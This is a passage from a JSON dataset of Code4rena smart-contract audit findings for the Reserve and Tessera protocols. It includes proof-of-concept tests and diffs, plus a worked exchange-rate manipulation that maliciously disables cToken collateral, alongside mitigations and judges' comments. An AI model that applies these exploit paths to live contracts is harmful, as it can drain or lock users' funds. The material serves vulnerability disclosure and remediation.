advanceBlocks(1_000_000)\n      await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, ethers.constants.MaxUint256)))\n\n      expect(await rToken.totalSupply()).to.eq(0)\n      await rToken.connect(owner).setRedemptionRateFloor(fp('1e4'))\n      await rToken.connect(owner).setScalingRedemptionRate(fp('0'))\n\n      // first issue\n      const issueAmount = fp('10000')\n      await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)\n      expect(await rToken.totalSupply()).to.eq(issueAmount)\n\n      // first redemption\n      expect(await rToken.redemptionLimit()).to.eq(await rToken.totalSupply())    // for first redemption the currentCharge value is capped by rToken.totalSupply() \n      await rToken.connect(addr1).redeem(issueAmount)\n      expect(await rToken.totalSupply()).to.eq(0)\n\n      // second redemption\n      await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n      expect(await rToken.balanceOf(addr1.address)).to.eq(issueAmount)\n      // from second redemtion onwards the battery discharge mechanism takes place correctly\n      await expect(rToken.connect(addr1).redeem(issueAmount)).to.be.revertedWith('redemption battery insufficient')\n    })\n  })\n```\n\n## Tools Used\nHardhat\n\n## Recommended Mitigation Steps\nThe `battery.lastBlock` value must be initialized in the `init` function of `RTokenP1`\n```solidity\n    function init(\n        // ...\n    ) external initializer {\n        // ...\n        battery.lastBlock = uint48(block.number);\n    }\n```",
      "summary": "\nThe bug report describes a vulnerability in the `RTokenP1` contract which implements a throttling mechanism using the `RedemptionBatteryLib` library. The library models a \"battery\" which \"recharges\" linearly block by block, over roughly 1 hour. The linear redemption limit is calculated in the `currentCharge` function. This function calculates the delta blocks by `uint48 blocks = uint48(block.number) - battery.lastBlock;`.\n\nThe bug here is that the `lastBlock` value is never initialized by the `RTokenP1` contract so its value defaults to `0`. This results in incorrect delta blocks value as the delta blocks comes out to be an incorrectly large value. The issue results in an instant first RToken redemption for the full `totalSupply` of the RToken. The battery discharging mechanism is completely neglected. It should be noted that the issue only exists for the first ever redemption as during the first redemption the `lastBlock` value gets updated with current block number.\n\nA test case was added to `test/RToken.test.ts` file and was ran using command `PROTO_IMPL=1 npx hardhat test ./test/RToken.test.ts` to demonstrate the bug. The recommended mitigation step is to initialize the `battery.lastBlock` value in the `init` function of `RTokenP1`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/452",
      "tags": [],
      "finders": [
        "AkshaySrivastav"
      ]
    },
    {
      "id": "16010",
      "title": "[H-02] Basket range formula is inefficient, leading the protocol to unnecessary haircut",
      "impact": "HIGH",
      "content": "\nThe `BackingManager.manageTokens()` function checks if there's any deficit in collateral, in case there is, if there's a surplus from another collateral token it trades it to cover the deficit, otherwise it goes for a 'haircut' and cuts the amount of basket 'needed' (i.e. the number of baskets RToken claims to hold).\n\nIn order to determine how much deficit/surplus there is the protocol calculates the 'basket range', where the top range is the optimistic estimation of the number of baskets the token would hold after trading and the bottom range is a pessimistic estimation.\n\nThe estimation is done by dividing the total collateral value by the price of 1  basket unit (for optimistic estimation the max value is divided by min price of basket-unit and vice versa).\n\nThe problem is that this estimation is inefficient, for cases where just a little bit of collateral is missing the range 'band' (range.top - range.bottom) would be about 4% (when oracle error deviation is ±1%) instead of less than 1%.\n\nThis can cause the protocol an unnecessary haircut of a few percent where the deficit can be solved by simple trading.\n\nThis would also cause the price of `RTokenAsset` to deviate more than necessary before the haircut.\n\n### Proof of Concept\n\nIn the following PoC, the basket changed so that it has 99% of the required collateral for 3 tokens and 95% for the 4th.\n\nThe basket range should be 98±0.03% (the basket has 95% collateral + 4% of 3/4 tokens. That 4% is worth 3±0.03% if we account for oracle error of their prices), but in reality the protocol calculates it as \\~97.9±2%.\n\nThat range causes the protocol to avoid trading and go to an unnecessary haircut to \\~95%\n\n```diff\ndiff --git a/contracts/plugins/assets/RTokenAsset.sol b/contracts/plugins/assets/RTokenAsset.sol\nindex 62223442..03d3c3f4 100644\n--- a/contracts/plugins/assets/RTokenAsset.sol\n+++ b/contracts/plugins/assets/RTokenAsset.sol\n@@ -123,7 +123,7 @@ contract RTokenAsset is IAsset {\n     // ==== Private ====\n \n     function basketRange()\n-        private\n+        public\n         view\n         returns (RecollateralizationLibP1.BasketRange memory range)\n     {\ndiff --git a/test/Recollateralization.test.ts b/test/Recollateralization.test.ts\nindex 3c53fa30..386c0673 100644\n--- a/test/Recollateralization.test.ts\n+++ b/test/Recollateralization.test.ts\n@@ -234,7 +234,42 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {\n         // Issue rTokens\n         await rToken.connect(addr1)['issue(uint256)'](issueAmount)\n       })\n+      it('PoC basket range', async () => {\n+        let range = await rTokenAsset.basketRange();\n+        let basketTokens = await basketHandler.basketTokens();\n+        console.log({range}, {basketTokens});\n+        // Change the basket so that current balance would be 99 or 95 percent of\n+        // the new basket\n+        let q99PercentLess = 0.25 / 0.99;\n+        let q95ercentLess = 0.25 / 0.95;\n+        await basketHandler.connect(owner).setPrimeBasket(basketTokens, [fp(q99PercentLess),fp(q99PercentLess), fp(q95ercentLess), fp(q99PercentLess)])\n+        await expect(basketHandler.connect(owner).refreshBasket())\n+        .to.emit(basketHandler, 'BasketSet')\n+\n+        expect(await basketHandler.status()).to.equal(CollateralStatus.SOUND)\n+        expect(await basketHandler.fullyCollateralized()).to.equal(false)\n+\n+        range = await rTokenAsset.basketRange();\n+\n+        // show the basket range is 95.9 to 99.9\n+        console.log({range});\n \n+        let needed = await rToken.basketsNeeded();\n+\n+        // show that prices are more or less the same\n+        let prices = await Promise.all( basket.map(x => x.price()));\n+\n+        // Protocol would do a haircut even though it can easily do a trade\n+        await backingManager.manageTokens([]);\n+\n+        // show how many baskets are left after the haircut\n+         needed = await rToken.basketsNeeded();\n+         \n+        console.log({prices, needed});\n+        return;\n+    \n+      })\n+      return;\n       it('Should select backup config correctly - Single backup token', async () => {\n         // Register Collateral\n         await assetRegistry.connect(owner).register(backupCollateral1.address)\n@@ -602,7 +637,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {\n         expect(quotes).to.eql([initialQuotes[0], initialQuotes[1], initialQuotes[3], bn('0.25e18')])\n       })\n     })\n-\n+    return;\n     context('With multiple targets', function () {\n       let issueAmount: BigNumber\n       let newEURCollateral: FiatCollateral\n@@ -785,7 +820,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () => {\n       })\n     })\n   })\n-\n+  return;\n   describe('Recollateralization', function () {\n     context('With very simple Basket - Single stablecoin', function () {\n       let issueAmount: BigNumber\n\n```\n\nOutput (comments are added by me):\n\n    {\n      range: [\n        top: BigNumber { value: \"99947916501440267201\" },  //  99.9 basket units\n        bottom: BigNumber { value: \"95969983506382791000\" } // 95.9 basket units\n      ]\n    }\n    {\n      prices: [\n        [\n          BigNumber { value: \"990000000000000000\" },\n          BigNumber { value: \"1010000000000000000\" }\n        ],\n        [\n          BigNumber { value: \"990000000000000000\" },\n          BigNumber { value: \"1010000000000000000\" }\n        ],\n        [\n          BigNumber { value: \"990000000000000000\" },\n          BigNumber { value: \"1010000000000000000\" }\n        ],\n        [\n          BigNumber { value: \"19800000000000000\" },\n          BigNumber { value: \"20200000000000000\" }\n        ]\n      ],\n      needed: BigNumber { value: \"94999999905000000094\" } // basket units after haircut: 94.9\n    }\n\n### Recommended Mitigation Steps\n\nChange the formula so that we first calculate the 'base' (i.e. the min amount of baskets the RToken can satisfy without trading):\n\n    base = basketsHeldBy(backingManager) // in the PoC's case it'd be 95\n    (diffLowValue, diffHighValue) = (0,0) \n    for each collateral token:\n        diff = collateralBalance - basketHandler.quantity(base) \n        (diffLowValue, diffHighValue) = diff * (priceLow, priceHigh)\n    addBasketsLow = diffLowValue / basketPriceHigh\n    addBasketHigh = diffHighValue / basketPriceLow\n    range.top = base + addBasketHigh\n    range.bottom = base + addBasketLow\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1400384608):**\n > Would like sponsor to comment on this issue and will determine severity from there.\n\n**[tmattimore (Reserve) acknowledged](https://github.com/code-423n4/2023-01-reserve-findings/issues/235)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1404082371):**\n > Agree this behaves the way described. We're aware of this problem and have been looking at fixes that are similar to the one suggested. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1409489804):**\n > Thank you @tbrent - I think High seems correct here as this does directly lead to a loss of value for users.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1412311915):**\n > @0xean - Seems right.\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.\n > [reserve-protocol/protocol#585](https://github.com/reserve-protocol/protocol/pull/585)\n\n**Status:** Not fully mitigated. Full details in [report from 0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49), and also included in Mitigation Review section below.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about the inefficiency of the `BackingManager.manageTokens()` function in the Reserve Protocol. The function checks if there's any deficit in collateral. If there is, it trades surplus from another collateral token to cover the deficit, otherwise it goes for a 'haircut' and cuts the amount of basket 'needed'. To determine how much deficit/surplus there is, the protocol calculates the 'basket range', where the top range is the optimistic estimation of the number of baskets the token would hold after trading and the bottom range is a pessimistic estimation.\n\nThe estimation is done by dividing the total collateral value by the price of 1 basket unit (for optimistic estimation the max value is divided by min price of basket-unit and vice versa). The problem is that this estimation is inefficient, for cases where just a little bit of collateral is missing the range 'band' (range.top - range.bottom) would be about 4% (when oracle error deviation is ±1%) instead of less than 1%. This can cause the protocol an unnecessary haircut of a few percent where the deficit can be solved by simple trading. This would also cause the price of `RTokenAsset` to deviate more than necessary before the haircut.\n\nThe recommended mitigation step for this bug is to change the formula so that the protocol first calculates the 'base' (i.e. the min amount of baskets the RToken can satisfy without trading). This will result in a more accurate calculation of the basket range, and will lead to less unnecessary haircuts.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/235",
      "tags": [],
      "finders": [
        "0xA5DF",
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16009",
      "title": "[H-01] Adversary can abuse a quirk of compound redemption to manipulate the underlying exchange rate and maliciously disable cToken collaterals",
      "impact": "HIGH",
      "content": "\nAdversary can maliciously disable cToken collateral to cause loss to rToken during restructuring.\n\n### Proof of Concept\n\n    if (referencePrice < prevReferencePrice) {\n        markStatus(CollateralStatus.DISABLED);\n    }\n\nCTokenNonFiatCollateral and CTokenFiatCollateral both use the default refresh behavior presented in FiatCollateral which has the above lines which automatically disables the collateral if the reference price ever decreases. This makes the assumption that cToken exchange rates never decrease but this is an incorrect assumption and can be exploited by an attacker to maliciously disable a cToken being used as collateral.\n\n[CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L480-L505)\n\n        uint redeemTokens;\n        uint redeemAmount;\n        /* If redeemTokensIn > 0: */\n        if (redeemTokensIn > 0) {\n            /*\n             * We calculate the exchange rate and the amount of underlying to be redeemed:\n             *  redeemTokens = redeemTokensIn\n             *  redeemAmount = redeemTokensIn x exchangeRateCurrent\n             */\n            redeemTokens = redeemTokensIn;\n            redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);\n        } else {\n            /*\n             * We get the current exchange rate and calculate the amount to be redeemed:\n             *  redeemTokens = redeemAmountIn / exchangeRate\n             *  redeemAmount = redeemAmountIn\n             */\n\n            // @audit redeemTokens rounds in favor of the user\n\n            redeemTokens = div_(redeemAmountIn, exchangeRate);\n            redeemAmount = redeemAmountIn;\n        }\n\nThe exchange rate can be manipulated by a tiny amount during the redeem process. The focus above is the scenario where the user requests a specific amount of underlying. When calculating the number of cTokens to redeem for a specific amount of underlying it rounds IN FAVOR of the user. This allows the user to redeem more underlying than the exchange rate would otherwise imply. Because the user can redeem *slightly* more than intended they can create a scenario in which the exchange rate actually drops after they redeem. This is because compound calculates the exchange rate dynamically using the current supply of cTokens and the assets under management.\n\n[CToken.sol](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/CToken.sol#L293-L312)\n\n    function exchangeRateStoredInternal() virtual internal view returns (uint) {\n        uint _totalSupply = totalSupply;\n        if (_totalSupply == 0) {\n            /*\n             * If there are no tokens minted:\n             *  exchangeRate = initialExchangeRate\n             */\n            return initialExchangeRateMantissa;\n        } else {\n            /*\n             * Otherwise:\n             *  exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply\n             */\n            uint totalCash = getCashPrior();\n            uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;\n            uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;\n\n\n            return exchangeRate;\n        }\n    }\n\nThe exchangeRate when \\_totalSupply != 0 is basically:\n\n    exchangeRate = netAssets * 1e18 / totalSupply\n\nUsing this formula for we can now walk through an example of how this can be exploited\n\nExample:\n\ncTokens always start at a whole token ratio of 50:1 so let's assume this ratio to begin with. Let's use values similar to the current supply of cETH which is \\~15M cETH and \\~300k ETH. We'll start by calculating the current ratio:\n\n    exchangeRate = 300_000 * 1e18 * 1e18 / 15_000_000 * 1e8 = 2e26 \n\nNow to exploit the ratio we request to redeem 99e8 redeemAmount which we can use to calculate the amount of tokens we need to burn:\n\n    redeemAmount = 99e8 * 1e18 / 2e26 = 1.98 -> 1\n\nAfter truncation the amount burned is only 1. Now we can recalculate our ratio:\n\n    exchangeRate = ((300_000 * 1e18 * 1e18) - 99e8) / ((15_000_000 * 1e8) - 1) = 199999999999999933333333333\n\nThe ratio has now been slightly decreased. In CTokenFiatCollateral the exchange rate is truncated to 18 dp so:\n\n    (referencePrice < prevReferencePrice) -> (19999999999999993 <  2e18) == true \n\nThis results in that the collateral is now disabled. This forces the vault to liquidate their holdings to convert to a backup asset. This will almost certainly incur losses to the protocol that were maliciously inflicted.\n\nThe path to exploit is relatively straightforward:\n\n`refresh()` cToken collateral to store current rate -> Manipulate compound rate via redemption -> `refresh()` cToken collateral to disable\n\n### Recommended Mitigation Steps\n\nSince the issue is with the underlying compound contracts, nothing can make the attack impossible but it can be made sufficiently difficult. The simplest deterrent would be to implement a rate error value (i.e. 100) so that the exchange rate has to drop more than that before the token is disabled. The recommended value for this is a bit more complicated to unpack. The amount that the exchange rate changes heavily depends on the number of cTokens minted. The larger the amount the less it changes. Additionally a malicious user can make consecutive redemptions to lower the rate even further. Using an error rate of 1e12 would make it nearly impossible for this to be exploited while still being very sensitive to real (and concerning) changes in exchange rate.\n\n    -   if (referencePrice < prevReferencePrice) {\n    +   if (referencePrice < prevReferencePrice - rateError) {\n            markStatus(CollateralStatus.DISABLED);\n        }\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1399632835):**\n > I do see in the cToken code base that the warden is correct with regard to the round down mechanism when redeeming cTokens using a redeemAmountIn.\n> \n> The question I think comes down to is this dust amount enough to counteract the interest that would be accrued to the cToken which is added during the refresh call in `CTokenFiatCollateral`\n> \n> Will leave open for sponsor review. \n\n**[tmattimore (Reserve) confirmed](https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1404050632)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/310#issuecomment-1404051723):**\n > Issue confirmed. \n> \n> Many defi protocols may have similar issues. We may choose to mitigate by building in revenue hiding to something like 1 part in 1 million to all collateral plugins. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR adds universal revenue hiding to all appreciating collateral: [reserve-protocol/protocol#620](https://github.com/reserve-protocol/protocol/pull/620)\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/35), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/23), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/25).\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the Reserve Protocol that could allow an adversary to maliciously disable cToken collateral and cause losses to rToken holders during restructuring. The exchange rate of cToken can be manipulated by a tiny amount during the redeem process, which allows the user to redeem more underlying than the exchange rate would otherwise imply. This can create a scenario in which the exchange rate actually drops after they redeem. The simplest deterrent would be to implement a rate error value (i.e. 100) so that the exchange rate has to drop more than that before the token is disabled. The recommended value for this is a bit more complicated to unpack, however, a rate error of 1e12 would make it nearly impossible for this to be exploited while still being very sensitive to real (and concerning) changes in exchange rate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/310",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "43296",
      "title": "[G-07] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "*Saves 5 gas per loop*\n\n*Instances (4)*:\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n60:                 j++;\n\n77:         insert(self, Bid(self.nextBidId++, owner, price, quantity));\n\n98:         for (uint256 i = 0; i < curUserBids.length; i++) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol)\n\n```solidity\nFile: src/modules/GroupBuy.sol\n\n74:         poolInfo[++currentId] = PoolInfo(\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43295",
      "title": "[G-06] Don't initialize variables with default value",
      "impact": "GAS",
      "content": "\n*Instances (2)*:\n```solidity\nFile: src/lib/MinPriorityQueue.sol\n\n98:         for (uint256 i = 0; i < curUserBids.length; i++) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol)\n\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n390:             for (uint256 i = 0; i < _offer.length; ++i) {\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43294",
      "title": "[G-01] Use assembly to check for `address(0)`",
      "impact": "GAS",
      "content": "*Saves 6 gas per instance*\n\n*Instances (2)*:\n```solidity\nFile: src/seaport/modules/OptimisticListingSeaport.sol\n\n106:             proposedListings[_vault].proposer == address(0) &&\n\n107:             activeListings[_vault].proposer == address(0)\n\n```\n[Link to code](https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43293",
      "title": "[M-09] GroupBuys that are completely filled still don't raise stated target amount",
      "impact": "MEDIUM",
      "content": "\n`createPool()` in GroupBuy.sol creates a new contribution pool around an NFT. It specifies a target `\\_initialPrice` as minimum amount of ETH the NFT will cost, and `\\_totalSupply` which is the number of Raes to be minted on purchase success.\n\nminBidPrices is calculated from the two numbers. All future bids must be at least minBidPrices. It is assumed that if the totalSupply of Raes is filled up, the group will collect the initialPrice.\n\n    // Calculates minimum bid price based on initial price of NFT and desired total supply\n    minBidPrices[currentId] = _initialPrice / _totalSupply;\n\nThe issue is that division rounding error will make minBidPrices too low. Therefore, when all Raes are minted using minBidPrices price:\n`minBidPrices[currentId] * _totalSupply != _initialPrice`\n\nTherefore, not enough money has been collected to fund the purchase.\n\nIt can be assumed that most people will use minBidPrices to drive the price they will choose. Therefore, even after discovering that the Group has not raised enough after filling the supply pool, it will be very hard to get everyone to top up the contribution by a bit. This is because the settled price which is collected from all contributions is minReservePrices, which is always the minimum price deposited.\n\nCode in contribute that updates minReservePrices:\n\n    // Updates minimum reserve price if filled quantity amount is greater than 0\n    if (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId);\n\nThe check in purchase() that we don't charge more than minReservePrices from each contribution:\n\n    if (_price > minReservePrices[_poolId] * filledQuantities[_poolId])\n        revert InvalidPurchase();\n\nWe can see an important contract functionality is not working as expected which will impair NFT purchases.\n\n### Impact\n\nGroupBuys that are completely filled still don't raise stated target amount.\n\n### Recommended Mitigation Steps\n\nRound the minBidPrices up, rather than down. It will ensure enough funds are collected.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/49#issuecomment-1358963067):**\n > Agree that the division rounding down will be a problem. Reasonable for a RAE holder to create a new pool where the `_initialPrice` isn't exactly divisible by `_totalSupply `:\n> \n> Eg. `_initialPrice = 100`, _totalSupply = 8`. Then purchase will always revert with `InvalidPurchase()` because:\n> - `minBidPrices[currentId] = 100 / 8` and \n> - `_price (100) > minReservePrices[_poolId] * filledQuantities[_poolId]) = 12 * 8 = 96` is true.\n\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/49#issuecomment-1406670889):**\n > https://github.com/fractional-company/modular-fractional/pull/213\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/57), [IllIllI](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/37), and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/19).\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `createPool()` in a smart contract called GroupBuy.sol. This function is used to create a contribution pool for a specific type of digital asset (NFT). The function takes in two parameters - `\\_initialPrice` which is the minimum amount of ETH the NFT will cost, and `\\_totalSupply` which is the number of NFTs that will be created.\n\nThe issue is that due to a rounding error in the code, the minimum bid price for the NFTs is calculated to be too low. This means that when all the NFTs are sold at this minimum bid price, the total amount collected will not be enough to fund the purchase of the NFTs. This could lead to problems with NFT purchases and could affect the overall functioning of the smart contract.\n\nThe recommended mitigation step is to round up the minimum bid price instead of rounding it down. This will ensure that enough funds are collected to fund the purchase of the NFTs. This mitigation has been confirmed by the team responsible for the smart contract.\n\nIn conclusion, the bug report highlights an important issue with the GroupBuy smart contract that could affect the purchase of NFTs. The recommended mitigation step has been implemented and confirmed by the team responsible for the smart contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/49",
      "tags": [],
      "finders": [
        "Trust",
        "gzeon"
      ]
    },
    {
      "id": "43292",
      "title": "[M-07] Loss of ETH for proposer when it is a contract that doesn't have fallback function.",
      "impact": "MEDIUM",
      "content": "\n`sendEthOrWeth()` is used in several locations in OptimisticListingSeaport:\n\n1.  rejectProposal - sent to proposer\n2.  rejectActive - sent to proposer\n3.  cash - sent to msg.sender\n\nThis is the implementation of sendEthOrWeth:\n\n    function _attemptETHTransfer(address _to, uint256 _value) internal returns (bool success) {\n        // Here increase the gas limit a reasonable amount above the default, and try\n        // to send ETH to the recipient.\n        // NOTE: This might allow the recipient to attempt a limited reentrancy attack.\n        (success, ) = _to.call{value: _value, gas: 30000}(\"\");\n    }\n    /// @notice Sends eth or weth to an address\n    /// @param _to Address to send to\n    /// @param _value Amount to send\n    function _sendEthOrWeth(address _to, uint256 _value) internal {\n        if (!_attemptETHTransfer(_to, _value)) {\n            WETH(WETH_ADDRESS).deposit{value: _value}();\n            WETH(WETH_ADDRESS).transfer(_to, _value);\n        }\n    }\n\nThe issue is that the receive could be a contract that does not have a fallback function. In this scenario, \\_attemptETHTransfer will fail and WETH would be transferred to the contract. It is likely that it bricks those funds for the contract as there is no reason it would support interaction with WETH tokens.\n\nIt can be reasonably assumed that developers will develop contracts which will interact with OptimisticListingSeaport using proposals. They are not warned and are likely to suffer losses.\n\n### Impact\n\nLoss of ETH for proposer when it is a contract that doesn't have fallback function.\n\n### Recommended Mitigation Steps\n\nEither enforce that proposer is an EOA or take in a recipient address for ETH transfers.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/40#issuecomment-1378996495):**\n > The argument here is about the contract being able to handle ETH but not WETH. If the ETH transfer fails (eg. gas used exceeds the 30k sent), then funds would be stuck.\n> \n> On the fence regarding severity here.\n\n**[stevennevins (Tessera) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/40#issuecomment-1381978554):**\n > I actually more agree with this being an issue:\n> > The argument here is about the contract being able to handle ETH but not WETH. If the ETH transfer fails (eg. gas used exceeds the 30k sent), then funds would be stuck.\n> \n> But it's not clear to me that is what was originally highlighted in the description of the issue.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/40#issuecomment-1382004749):**\n > Yeah it's not fully clear because the premise is the contract not having a fallback function, but the intended effect of not being able to handle WETH is.\n> > It is likely that it bricks those funds for the contract as there is no reason it would support interaction with WETH tokens.\n\n\n\n***\n\n",
      "summary": "\nA function called `sendEthOrWeth()` is causing issues in the OptimisticListingSeaport code. This function is used in three different places and is supposed to send either ETH or WETH to a specified address. However, there is a problem with the implementation of this function that could result in the loss of funds for users. If the receiving address is a contract that does not have a fallback function, the transfer will fail and the WETH tokens will be stuck in the contract. This could lead to financial losses for users who interact with the OptimisticListingSeaport using proposals. To mitigate this issue, the developers are advised to enforce that the receiving address is an EOA or to take in a recipient address for ETH transfers. The severity of this issue is debated among the judges, but it is agreed that it could potentially cause financial losses for users. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/40",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "43291",
      "title": "[M-06] Only one `GroupBuy` can ever use USDT or similar tokens with front-running approval protections",
      "impact": "MEDIUM",
      "content": "\nCalling `approve()` without first calling `approve(0)` if the current approval is non-zero will revert with some tokens, such as Tether (USDT). While Tether is known to do this, it applies to other tokens as well, which are trying to protect against [this attack vector](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit).\n\n### Impact\n\nOnly the first listing will start with the conduit's approval at zero and will be able to change it to the maximum. Thereafter, every attempt to approve that same token will revert, causing any order using this lister to revert, including a re-listing at a lower price, which the protocol allows for.\n\n### Proof of Concept\n\nThe seaport conduit address is set in the constructor as an immutable variable, so it's not possible to change it once the issue is hit:\n\n```solidity\n// File: src/seaport/targets/SeaportLister.sol : SeaportLister.constructor()   #1\n\n19        constructor(address _conduit) {\n20 @>         conduit = _conduit;\n21:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L19-L21>\n\nThe approval is set to the maximum without checking whether it's already the maximum:\n\n```solidity\n// File: src/seaport/targets/SeaportLister.sol : SeaportLister.validateListing()   #2\n\n29                for (uint256 i; i < ordersLength; ++i) {\n30                    uint256 offerLength = _orders[i].parameters.offer.length;\n31                    for (uint256 j; j < offerLength; ++j) {\n32                        OfferItem memory offer = _orders[i].parameters.offer[j];\n33                        address token = offer.token;\n34                        ItemType itemType = offer.itemType;\n35                        if (itemType == ItemType.ERC721)\n36                            IERC721(token).setApprovalForAll(conduit, true);\n37                        if (itemType == ItemType.ERC1155)\n38                            IERC1155(token).setApprovalForAll(conduit, true);\n39                        if (itemType == ItemType.ERC20)\n40 @>                         IERC20(token).approve(conduit, type(uint256).max);\n41                    }\n42                }\n43            }\n44            // Validates the order on-chain so no signature is required to fill it\n45            assert(ConsiderationInterface(_consideration).validate(_orders));\n46:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L29-L46>\n\nThe README states: `The Tessera Protocol is designed around the concept of Hyperstructures, which are crypto protocols that can run for free and forever, without maintenance, interruption or intermediaries`, and having to deploy a new `SeaportLister` in order to have a fresh conduit that also needs to be deployed, 